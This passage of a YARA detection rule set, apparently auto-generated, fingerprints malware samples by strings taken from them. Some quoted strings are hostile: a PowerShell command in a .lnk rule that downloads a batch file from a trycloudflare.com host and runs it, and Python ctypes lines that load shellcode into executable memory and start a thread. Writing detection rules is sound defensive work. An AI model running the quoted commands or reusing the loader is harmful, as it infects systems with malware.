      $s6 = "=e&&void 0!==t?(s=t&&t.jquery?s.pushStack(t.get()):t,!1):void 0:d.error(\"no such method '\"+i+\"' for \"+o+\" widget instance\"" ascii /* score: '15.00'*/
      $s7 = "erable.not(t).get())},_delay:function(t,e){var i=this;return setTimeout(function(){return(\"string\"==typeof t?i[t]:t).apply(i,a" ascii /* score: '15.00'*/
      $s8 = "get.extend({},this.options[t]),s=0;s<i.length-1;s++)n[i[s]]=n[i[s]]||{},n=n[i[s]];if(t=i.pop(),1===arguments.length)return void " ascii /* score: '15.00'*/
      $s9 = "||e.isDefaultPrevented())}},d.each({show:\"fadeIn\",hide:\"fadeOut\"},function(o,r){d.Widget.prototype[\"_\"+o]=function(e,t,i){" ascii /* score: '15.00'*/
      $s10 = "ndelegate(e),this.bindings=d(this.bindings.not(t).get()),this.focusable=d(this.focusable.not(t).get()),this.hoverable=d(this.hov" ascii /* score: '15.00'*/
      $s11 = "defaultElement:\"<div>\",options:{disabled:!1,create:null},_createWidget:function(t,e){e=d(e||this.defaultElement||this)[0],this" ascii /* score: '15.00'*/
      $s12 = "),t?(o=r=d(o),this.bindings=this.bindings.add(o)):(t=o,o=this.element,r=this.widget()),d.each(t,function(t,e){function i(){if(s|" ascii /* score: '15.00'*/
      $s13 = "this))})),s}},d.Widget=function(){},d.Widget._childConstructors=[],d.Widget.prototype={widgetName:\"widget\",widgetEventPrefix:" ascii /* score: '15.00'*/
      $s14 = " * http://jquery.org/license" fullword ascii /* score: '14.00'*/
      $s15 = "{this.focusable=this.focusable.add(t),this._on(t,{focusin:function(t){d(t.currentTarget).addClass(\"ui-state-focus\")},focusout:" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_4fce4c1c58eb122d14d42b8a03d22b54bbdac34cb9a6f01f7a1725661da035a8_4fce4c1c {
   meta:
      description = "_subset_batch - file 4fce4c1c58eb122d14d42b8a03d22b54bbdac34cb9a6f01f7a1725661da035a8_4fce4c1c.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4fce4c1c58eb122d14d42b8a03d22b54bbdac34cb9a6f01f7a1725661da035a8"
   strings:
      $x1 = "\"undefined\"==typeof jQuery.migrateMute&&(jQuery.migrateMute=!0),function(a,b,c){function d(c){var d=b.console;f[c]||(f[c]=!0,a" ascii /* score: '54.50'*/
      $s2 = "a)||/(webkit)[ \\/]([\\w.]+)/.exec(a)||/(opera)(?:.*version|)[ \\/]([\\w.]+)/.exec(a)||/(msie) ([\\w.]+)/.exec(a)||a.indexOf(\"c" ascii /* score: '27.00'*/
      $s3 = "ble\")<0&&/(mozilla)(?:.*? rv:([\\w.]+)|)/.exec(a)||[];return{browser:b[1]||\"\",version:b[2]||\"0\"}},a.browser||(o=a.uaMatch(n" ascii /* score: '24.00'*/
      $s4 = "==typeof b&&!a.isPlainObject(e)&&(g=w.exec(a.trim(b)))&&g[0]&&(t.test(b)||d(\"$(html) HTML strings must start with '<' character" ascii /* score: '16.00'*/
      $s5 = "[],b.console&&b.console.log&&b.console.log(\"JQMIGRATE: Migrate is installed\"+(a.migrateMute?\"\":\" with logging active\")+\"," ascii /* score: '16.00'*/
      $s6 = "fn.load,I=\"ajaxStart|ajaxStop|ajaxSend|ajaxComplete|ajaxError|ajaxSuccess\",J=new RegExp(\"\\\\b(?:\"+I+\")\\\\b\"),K=/(?:^|\\s" ascii /* score: '15.00'*/
      $s7 = "or.userAgent),p={},o.browser&&(p[o.browser]=!0,p.version=o.version),p.chrome?p.webkit=!0:p.webkit&&(p.safari=!0),a.browser=p),e(" ascii /* score: '15.00'*/
      $s8 = "uery.parseJSON requires a valid JSON string\"),null)},a.uaMatch=function(a){a=a.toLowerCase();var b=/(chrome)[ \\/]([\\w.]+)/.ex" ascii /* score: '15.00'*/
      $s9 = "undefined\"!=typeof h.getElementsByTagName&&(j=a.grep(a.merge([],h.getElementsByTagName(\"script\")),i),k.splice.apply(k,[g+1,0]" ascii /* score: '15.00'*/
      $s10 = "rseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;" fullword ascii /* score: '12.00'*/
      $s11 = ",f){if(Object.defineProperty)try{return void Object.defineProperty(b,c,{configurable:!0,enumerable:!0,get:function(){return d(f)" ascii /* score: '12.00'*/
      $s12 = "){var d=a.cssHooks[c]&&a.cssHooks[c].get;d&&(a.cssHooks[c].get=function(){var a;return y=!0,a=d.apply(this,arguments),y=!1,a})})" ascii /* score: '12.00'*/
      $s13 = "h=a.attr,i=a.attrHooks.value&&a.attrHooks.value.get||function(){return null},j=a.attrHooks.value&&a.attrHooks.value.set||functio" ascii /* score: '12.00'*/
      $s14 = "mpat\"===document.compatMode&&d(\"jQuery is not compatible with Quirks Mode\");var g=a(\"<input/>\",{size:1}).attr(\"size\")&&a." ascii /* score: '11.00'*/
      $s15 = "a,\"browser\",a.browser,\"jQuery.browser is deprecated\"),a.boxModel=a.support.boxModel=\"CSS1Compat\"===document.compatMode,e(a" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule sig_7065a2f340ef544975e707f204c09f4ac96ce14ebf018b906eea90b290e0cb60_7065a2f3 {
   meta:
      description = "_subset_batch - file 7065a2f340ef544975e707f204c09f4ac96ce14ebf018b906eea90b290e0cb60_7065a2f3.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7065a2f340ef544975e707f204c09f4ac96ce14ebf018b906eea90b290e0cb60"
   strings:
      $x1 = "!function(t){\"function\"==typeof define&&define.amd?define([\"jquery\",\"./core\",\"./widget\"],t):t(jQuery)}(function(l){retur" ascii /* score: '50.00'*/
      $s2 = " * http://jqueryui.com" fullword ascii /* score: '25.00'*/
      $s3 = "-widget-content ui-corner-all\").toggleClass(\"ui-tabs-collapsible\",t.collapsible),this._processTabs(),t.active=this._initialAc" ascii /* score: '21.00'*/
      $s4 = " * http://api.jqueryui.com/tabs/" fullword ascii /* score: '21.00'*/
      $s5 = "et(\"ui.tabs\",{version:\"1.11.4\",delay:300,options:{active:null,collapsible:!1,event:\"click\",heightStyle:\"content\",hide:nu" ascii /* score: '18.00'*/
      $s6 = "isabled=l.map(e.filter(\".ui-state-disabled\"),function(t){return e.index(t)}),this._processTabs(),!1!==t.active&&this.anchors.l" ascii /* score: '18.00'*/
      $s7 = "orTab(this.active).show().attr({\"aria-hidden\":\"false\"})):this.tabs.eq(0).attr(\"tabIndex\",0)},_processTabs:function(){var o" ascii /* score: '18.00'*/
      $s8 = "widget-content ui-tabs-active ui-tabs-panel\").removeAttr(\"tabIndex\").removeAttr(\"aria-live\").removeAttr(\"aria-busy\").remo" ascii /* score: '17.00'*/
      $s9 = "tabIndex:-1}),this.panels.not(this._getPanelForTab(this.active)).hide().attr({\"aria-hidden\":\"true\"}),this.active.length?(thi" ascii /* score: '15.00'*/
      $s10 = " * http://jquery.org/license" fullword ascii /* score: '14.00'*/
      $s11 = "th?this.active:t).find(\".ui-tabs-anchor\")[0],this._eventHandler({target:t,currentTarget:t,preventDefault:l.noop}))},_findActiv" ascii /* score: '14.00'*/
      $s12 = "tr(\"id\",t).addClass(\"ui-tabs-panel ui-widget-content ui-corner-bottom\").data(\"ui-tabs-destroy\",!0)},_setupDisabled:functio" ascii /* score: '14.00'*/
      $s13 = ".removeUniqueId(),this.tablist.unbind(this.eventNamespace),this.tabs.add(this.panels).each(function(){l.data(this,\"ui-tabs-dest" ascii /* score: '14.00'*/
      $s14 = "t){var e=this.options,i=this.active,a=l(t.currentTarget).closest(\"li\"),s=a[0]===i[0],n=s&&e.collapsible,r=n?l():this._getPanel" ascii /* score: '14.00'*/
      $s15 = "tr({role:\"presentation\",tabIndex:-1}),this.panels=l(),this.anchors.each(function(t,e){var i,a,s,n=l(e).uniqueId().attr(\"id\")" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule sig_2bad1f32f72bf839f75914dc06b6845c5bf82125c6d275eb7d8378960874d731_2bad1f32 {
   meta:
      description = "_subset_batch - file 2bad1f32f72bf839f75914dc06b6845c5bf82125c6d275eb7d8378960874d731_2bad1f32.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2bad1f32f72bf839f75914dc06b6845c5bf82125c6d275eb7d8378960874d731"
   strings:
      $s1 = "corrivals.TargetPath = WScript.ScriptFullName;" fullword ascii /* score: '27.00'*/
      $s2 = "bibliologist('Files to be processed:\\n\\t' + unwire.join('\\n\\t'));" fullword ascii /* score: '25.00'*/
      $s3 = "bibliologist.imperceivable = WScript.FullName.match(/cscript\\.exe$/i) && WScript.Arguments.Named.Exists('V');" fullword ascii /* score: '25.00'*/
      $s4 = "var tininess = WScript.ScriptFullName.replace(/[^\\\\]+$/, '') + 'clinkery2fb.xsl';" fullword ascii /* score: '21.00'*/
      $s5 = "        var swungen = sorites.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '21.00'*/
      $s6 = "corrivals.Description = 'Convert .DOC to .' + key.toUpperCase();" fullword ascii /* score: '19.00'*/
      $s7 = "bibliologist('Open \"' + sniffily + '\"');" fullword ascii /* score: '18.00'*/
      $s8 = "        var androgynos = sorites.Get(\"Win32_Process\");" fullword ascii /* score: '18.00'*/
      $s9 = "bibliologist('Creating of the shortcut for \"' + key + '\" format');" fullword ascii /* score: '16.00'*/
      $s10 = "// Process file list" fullword ascii /* score: '15.00'*/
      $s11 = "bibliologist('Processing arguments');" fullword ascii /* score: '15.00'*/
      $s12 = "var circumboreal = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '15.00'*/
      $s13 = "+ e.description);" fullword ascii /* score: '14.00'*/
      $s14 = "corrivals.Arguments = '/f:' + key;" fullword ascii /* score: '14.00'*/
      $s15 = "        this[\"Factory_Records\"] = this[\"circumboreal\"].GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 100KB and
      8 of them
}

rule sig_58272f4e3d621d0dc0408b56a43ecb8274ceb95d26b67be00b9c50235cfec82c_58272f4e {
   meta:
      description = "_subset_batch - file 58272f4e3d621d0dc0408b56a43ecb8274ceb95d26b67be00b9c50235cfec82c_58272f4e.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "58272f4e3d621d0dc0408b56a43ecb8274ceb95d26b67be00b9c50235cfec82c"
   strings:
      $s1 = "micorsercisecxbit21r4q.exe" fullword ascii /* score: '22.00'*/
      $s2 = "libidn2-0.dll" fullword ascii /* score: '20.00'*/
      $s3 = "libpsl-5.dll" fullword ascii /* score: '20.00'*/
      $s4 = "libunistring-5.dll" fullword ascii /* score: '20.00'*/
      $s5 = "libintl-8.dllPK" fullword ascii /* score: '16.00'*/
      $s6 = "UFRFJFZFz" fullword ascii /* base64 encoded string 'PTE$VE' */ /* score: '14.00'*/
      $s7 = "libpsl-5.dllPK" fullword ascii /* score: '13.00'*/
      $s8 = "libunistring-5.dllPK" fullword ascii /* score: '13.00'*/
      $s9 = "libiconv-2.dllPK" fullword ascii /* score: '13.00'*/
      $s10 = "libidn2-0.dllPK" fullword ascii /* score: '13.00'*/
      $s11 = "micorsercisecxbit21r4q.exePK" fullword ascii /* score: '11.00'*/
      $s12 = "8Q0I0Y0M0" fullword ascii /* base64 encoded string 'CB4cC4' */ /* score: '11.00'*/
      $s13 = "vpQpIpipepKp{pGpOpop_" fullword ascii /* score: '10.00'*/
      $s14 = "\"43<+<;</" fullword ascii /* score: '9.00'*/ /* hex encoded string 'C' */
      $s15 = "?6<6>6=6?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'ff' */
   condition:
      uint16(0) == 0x4b50 and filesize < 12000KB and
      8 of them
}

rule sig_2df108f3bf32679f9bae68412e4debad938fecdba268e15a0d29803145f7303a_2df108f3 {
   meta:
      description = "_subset_batch - file 2df108f3bf32679f9bae68412e4debad938fecdba268e15a0d29803145f7303a_2df108f3.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2df108f3bf32679f9bae68412e4debad938fecdba268e15a0d29803145f7303a"
   strings:
      $x1 = "mpclient.dll" fullword ascii /* reversed goodware string 'lld.tneilcpm' */ /* score: '33.00'*/
      $s2 = "2. Launch InstallerFull_1.1.1_x64.exe" fullword ascii /* score: '19.00'*/
      $s3 = "InstallerFull_1.1.1_x64.exe" fullword ascii /* score: '19.00'*/
      $s4 = "rJyZyJyR9" fullword ascii /* base64 encoded string ''&r'$}' */ /* score: '15.00'*/
      $s5 = "README.txt1. Unpack this archive" fullword ascii /* score: '14.00'*/
      $s6 = "iG - k" fullword ascii /* score: '9.00'*/
      $s7 = "* $S*]" fullword ascii /* score: '9.00'*/
      $s8 = "* ,Kz*" fullword ascii /* score: '9.00'*/
      $s9 = "svgvvgwgggg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 13000KB and
      1 of ($x*) and all of them
}

rule sig_1cde8a7a2c91aa07174e6abcda313a47213cd4c623313bac1bf1df6638eafc3e_1cde8a7a {
   meta:
      description = "_subset_batch - file 1cde8a7a2c91aa07174e6abcda313a47213cd4c623313bac1bf1df6638eafc3e_1cde8a7a.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1cde8a7a2c91aa07174e6abcda313a47213cd4c623313bac1bf1df6638eafc3e"
   strings:
      $x1 = "                                                                                                                                " wide /* score: '55.00'*/
      $x2 = "%SystemRoot%\\System32\\shell32.dll" fullword wide /* score: '34.00'*/
      $x3 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii /* score: '31.00'*/
      $s4 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s5 = "Jpowershell.exe" fullword wide /* score: '27.00'*/
      $s6 = "Generated: 2025-09-16 23:02:35?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s7 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 10KB and
      1 of ($x*) and all of them
}

rule sig_3f459537fa37fc7e4ffaa6e6a7b18492ae52ee7fead5484f71c2ab818fa8c084_3f459537 {
   meta:
      description = "_subset_batch - file 3f459537fa37fc7e4ffaa6e6a7b18492ae52ee7fead5484f71c2ab818fa8c084_3f459537.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3f459537fa37fc7e4ffaa6e6a7b18492ae52ee7fead5484f71c2ab818fa8c084"
   strings:
      $x1 = "                                                                                                                    -WindowStyle" wide /* score: '55.00'*/
      $x2 = "%SystemRoot%\\System32\\shell32.dll" fullword wide /* score: '34.00'*/
      $x3 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii /* score: '31.00'*/
      $s4 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s5 = "Jpowershell.exe" fullword wide /* score: '27.00'*/
      $s6 = "Generated: 2025-09-17 16:15:08?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s7 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 10KB and
      1 of ($x*) and all of them
}

rule sig_69a80bdd8b0be6b56ce1a9a84c490835df468482d9daf35da30b21f4bec2b5d6_69a80bdd {
   meta:
      description = "_subset_batch - file 69a80bdd8b0be6b56ce1a9a84c490835df468482d9daf35da30b21f4bec2b5d6_69a80bdd.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "69a80bdd8b0be6b56ce1a9a84c490835df468482d9daf35da30b21f4bec2b5d6"
   strings:
      $x1 = "-command iwr -Uri https://mandate-paul-backing-residence.trycloudflare.com/tyga.bat -OutFile $env:TEMP\\tyga.bat; & $env:TEMP\\t" wide /* score: '34.00'*/
      $x2 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii /* score: '31.00'*/
      $x3 = "9C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '31.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 2KB and
      1 of ($x*)
}

rule sig_1ce964b0099135c06ae35af669c8a41bc923d4330c897019d1b35d7b2f8b9360_1ce964b0 {
   meta:
      description = "_subset_batch - file 1ce964b0099135c06ae35af669c8a41bc923d4330c897019d1b35d7b2f8b9360_1ce964b0.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1ce964b0099135c06ae35af669c8a41bc923d4330c897019d1b35d7b2f8b9360"
   strings:
      $s1 = "597158613176" ascii /* score: '17.00'*/ /* hex encoded string 'YqXa1v' */
      $s2 = "32746162272938" ascii /* score: '17.00'*/ /* hex encoded string '2tab')8' */
      $s3 = "27006926762860" ascii /* score: '17.00'*/ /* hex encoded string ''i&v(`' */
      $s4 = "30405460587021" ascii /* score: '17.00'*/ /* hex encoded string '0@T`Xp!' */
      $s5 = "21662757707754" ascii /* score: '17.00'*/ /* hex encoded string '!f'WpwT' */
      $s6 = "22387229425932" ascii /* score: '17.00'*/ /* hex encoded string '"8r)BY2' */
      $s7 = "24535332486840" ascii /* score: '17.00'*/ /* hex encoded string '$SS2Hh@' */
      $s8 = "24003863323658" ascii /* score: '17.00'*/ /* hex encoded string '$8c26X' */
      $s9 = "21427253797070" ascii /* score: '17.00'*/ /* hex encoded string '!BrSypp' */
      $s10 = "26515277206756" ascii /* score: '17.00'*/ /* hex encoded string '&QRw gV' */
      $s11 = "20682666317327" ascii /* score: '17.00'*/ /* hex encoded string ' h&f1s'' */
      $s12 = "29326556756059" ascii /* score: '17.00'*/ /* hex encoded string ')2eVu`Y' */
      $s13 = "34602846687955" ascii /* score: '17.00'*/ /* hex encoded string '4`(FhyU' */
      $s14 = "31403474524076" ascii /* score: '17.00'*/ /* hex encoded string '1@4tR@v' */
      $s15 = "22302972252357" ascii /* score: '17.00'*/ /* hex encoded string '"0)r%#W' */
   condition:
      uint16(0) == 0x6f6c and filesize < 1000KB and
      8 of them
}

rule sig_1daf6da9dc7ceb9fe690672aee5a6e006ae355a989eab93c7cbdb35cd4a56479_1daf6da9 {
   meta:
      description = "_subset_batch - file 1daf6da9dc7ceb9fe690672aee5a6e006ae355a989eab93c7cbdb35cd4a56479_1daf6da9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1daf6da9dc7ceb9fe690672aee5a6e006ae355a989eab93c7cbdb35cd4a56479"
   strings:
      $s1 = "POSTsC_c" fullword ascii /* score: '9.00'*/
      $s2 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
      $s3 = "-form-url#coded/" fullword ascii /* score: '9.00'*/
      $s4 = "livetimeout" fullword ascii /* score: '8.00'*/
      $s5 = "+%s%. >k" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule sig_1ef92d0f2ef61dbc17e6ee0d6659f5539707d332833e90f355b3d53ead288bfa_1ef92d0f {
   meta:
      description = "_subset_batch - file 1ef92d0f2ef61dbc17e6ee0d6659f5539707d332833e90f355b3d53ead288bfa_1ef92d0f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1ef92d0f2ef61dbc17e6ee0d6659f5539707d332833e90f355b3d53ead288bfa"
   strings:
      $s1 = "UMyy\\gL:\\" fullword ascii /* score: '10.00'*/
      $s2 = ",&K- /s" fullword ascii /* score: '9.00'*/
      $s3 = "qJDLl*.X" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 10000KB and
      all of them
}

rule sig_1def9728d7adecbbbb38b79071a2cb97a39d5fd89adcc66965141bb70c4928fa_1def9728 {
   meta:
      description = "_subset_batch - file 1def9728d7adecbbbb38b79071a2cb97a39d5fd89adcc66965141bb70c4928fa_1def9728.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1def9728d7adecbbbb38b79071a2cb97a39d5fd89adcc66965141bb70c4928fa"
   strings:
      $s1 = "/opt/shell/test.txt" fullword ascii /* score: '16.00'*/
      $s2 = "ctypes.windll.kernel32.WaitForSingleObject(handle, -1)" fullword ascii /* score: '16.00'*/
      $s3 = "ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64" fullword ascii /* score: '12.00'*/
      $s4 = "handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)" fullword ascii /* score: '12.00'*/
      $s5 = "ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))" fullword ascii /* score: '12.00'*/
      $s6 = "rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x3062 and filesize < 50KB and
      all of them
}

rule sig_1e907a1d1a3e8d631c5fbd6d5748811b710f984f7aed1c1c07c2940b7fe5be7a_1e907a1d {
   meta:
      description = "_subset_batch - file 1e907a1d1a3e8d631c5fbd6d5748811b710f984f7aed1c1c07c2940b7fe5be7a_1e907a1d.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1e907a1d1a3e8d631c5fbd6d5748811b710f984f7aed1c1c07c2940b7fe5be7a"
   strings:
      $s1 = "jjjjj=" fullword ascii /* reversed goodware string '=jjjjj' */ /* score: '11.00'*/
      $s2 = "<\\#\"2#!1" fullword ascii /* score: '9.00'*/ /* hex encoded string '!' */
      $s3 = "~4~4-4-4(" fullword ascii /* score: '9.00'*/ /* hex encoded string 'DD' */
      $s4 = "3#23#23#:3" fullword ascii /* score: '9.00'*/ /* hex encoded string '223' */
      $s5 = "ZHNi)+ " fullword ascii /* score: '8.00'*/
      $s6 = "fffffffffe" ascii /* score: '8.00'*/
      $s7 = "gfvffffe" fullword ascii /* score: '8.00'*/
      $s8 = "fvgfffffffffe" fullword ascii /* score: '8.00'*/
      $s9 = "dcijttc" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule sig_523dadfaab928d72211922a678c133ef603ef81ee04c2b3f30cf90d6c9ae43b3_523dadfa {
   meta:
      description = "_subset_batch - file 523dadfaab928d72211922a678c133ef603ef81ee04c2b3f30cf90d6c9ae43b3_523dadfa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "523dadfaab928d72211922a678c133ef603ef81ee04c2b3f30cf90d6c9ae43b3"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule sig_1ff928b495e50c3434e2ebd5c8ee2d65ec22e96c5c9e3be950f958a8302b577f_1ff928b4 {
   meta:
      description = "_subset_batch - file 1ff928b495e50c3434e2ebd5c8ee2d65ec22e96c5c9e3be950f958a8302b577f_1ff928b4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1ff928b495e50c3434e2ebd5c8ee2d65ec22e96c5c9e3be950f958a8302b577f"
   strings:
      $s1 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s2 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_50ab79a2d24e6e53229622706eb388bb138184aac606e5e4703b337ed9daa726_50ab79a2 {
   meta:
      description = "_subset_batch - file 50ab79a2d24e6e53229622706eb388bb138184aac606e5e4703b337ed9daa726_50ab79a2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "50ab79a2d24e6e53229622706eb388bb138184aac606e5e4703b337ed9daa726"
   strings:
      $s1 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s2 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s3 = "src/floods/packet_build.rs" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_21563844d15252947d8903beb0bf548794f1afac9d70b6395f0cd70a6927ca69_21563844 {
   meta:
      description = "_subset_batch - file 21563844d15252947d8903beb0bf548794f1afac9d70b6395f0cd70a6927ca69_21563844.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "21563844d15252947d8903beb0bf548794f1afac9d70b6395f0cd70a6927ca69"
   strings:
      $s1 = "RobloxPlayerInstaller.exe" fullword ascii /* score: '22.00'*/
      $s2 = "ywyyyyy" fullword ascii /* score: '11.00'*/
      $s3 = "1n1n1n" fullword ascii /* reversed goodware string 'n1n1n1' */ /* score: '11.00'*/
      $s4 = "'2_a&\\\\" fullword ascii /* score: '9.00'*/ /* hex encoded string '*' */
      $s5 = "]RwsR* C" fullword ascii /* score: '8.00'*/
      $s6 = "bdbebfb" ascii /* score: '8.00'*/
      $s7 = "7cZCdo'] -Pn" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 9000KB and
      all of them
}

rule sig_3e9831e4c4ab85d17e127689d9c342c4f5dfdfacb811e7036b65a17b84642b3d_3e9831e4 {
   meta:
      description = "_subset_batch - file 3e9831e4c4ab85d17e127689d9c342c4f5dfdfacb811e7036b65a17b84642b3d_3e9831e4.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3e9831e4c4ab85d17e127689d9c342c4f5dfdfacb811e7036b65a17b84642b3d"
   strings:
      $x1 = "<td width=\"20%\" align=\"center\" valign=\"bottom\"><a href=\"file?\" title=\"Link to this report\" target=\"https://virusshare" ascii /* score: '33.00'*/
      $x2 = "<td width=\"20%\" align=\"center\" valign=\"bottom\"><a href=\"file?\" title=\"Link to this report\" target=\"https://virusshare" ascii /* score: '31.00'*/
      $s3 = "        <div class=\"account\" id=\"noprint\">Account: <a href=\"https://virusshare.com/account\">admin</a> - <a href=\"https://" ascii /* score: '27.00'*/
      $s4 = "usshare.com/images/downloadg.svg\" width=30 height=30></a></td>" fullword ascii /* score: '26.00'*/
      $s5 = "<td width=\"20%\" align=\"center\" valign=\"bottom\"><a title=\"Benign files are not availabe for download (yet)\"><img src=\"ht" ascii /* score: '26.00'*/
      $s6 = "<a href=\"https://virusshare.com\">Home</a>&nbsp;&bull;&nbsp;<a href=\"https://virusshare.com/hashes\">Hashes</a>&nbsp;&bull;&nb" ascii /* score: '23.00'*/
      $s7 = "are.com/logout\">Logout</a></div>" fullword ascii /* score: '22.00'*/
      $s8 = "        <div class=\"account\" id=\"noprint\">Account: <a href=\"https://virusshare.com/account\">admin</a> - <a href=\"https://" ascii /* score: '22.00'*/
      $s9 = "<a href=\"/\" class=\"title\">VirusShare.com</a> - Because Sharing is Caring<br />" fullword ascii /* score: '21.00'*/
      $s10 = "<td width=\"20%\" align=\"center\" valign=\"bottom\">&nbsp;<a title=\"Source data is not available for this file (yet)\"><img sr" ascii /* score: '20.00'*/
      $s11 = "a href=\"https://virusshare.com/torrents\">Torrents</a>&nbsp;&bull;&nbsp;<a href=\"https://virusshare.com/research\">Research</a" ascii /* score: '20.00'*/
      $s12 = " href=\"https://virusshare.com/favicon.ico\">" fullword ascii /* score: '20.00'*/
      $s13 = "<a href=\"https://virusshare.com\">Home</a>&nbsp;&bull;&nbsp;<a href=\"https://virusshare.com/hashes\">Hashes</a>&nbsp;&bull;&nb" ascii /* score: '19.00'*/
      $s14 = "<title>VirusShare.com</title>" fullword ascii /* score: '17.00'*/
      $s15 = "://virusshare.com/images/ping.svg\" width=23 height=30></a></td>" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x3c0a and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_22c04b8ed8109ee08b4b00def0049ac2b31a0a6d1119ef7ead6b4aeed3c772bf_22c04b8e {
   meta:
      description = "_subset_batch - file 22c04b8ed8109ee08b4b00def0049ac2b31a0a6d1119ef7ead6b4aeed3c772bf_22c04b8e.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "22c04b8ed8109ee08b4b00def0049ac2b31a0a6d1119ef7ead6b4aeed3c772bf"
   strings:
      $s1 = "jjjjjk" fullword ascii /* reversed goodware string 'kjjjjj' */ /* score: '15.00'*/
      $s2 = "SSSSSSSS^" fullword ascii /* reversed goodware string '^SSSSSSSS' */ /* score: '14.00'*/
      $s3 = "SSSSS_" fullword ascii /* reversed goodware string '_SSSSS' */ /* score: '11.00'*/
      $s4 = "lJRd:\\;" fullword ascii /* score: '10.00'*/
      $s5 = "nnnnnnnnnnnnnr" fullword ascii /* score: '8.00'*/
      $s6 = "jjjjjjjjjjjjjk" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 5000KB and
      all of them
}

rule sig_665e26d5638cc96aa78569c46127a1227b265784353d124c63e169ffe8fd5498_665e26d5 {
   meta:
      description = "_subset_batch - file 665e26d5638cc96aa78569c46127a1227b265784353d124c63e169ffe8fd5498_665e26d5.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "665e26d5638cc96aa78569c46127a1227b265784353d124c63e169ffe8fd5498"
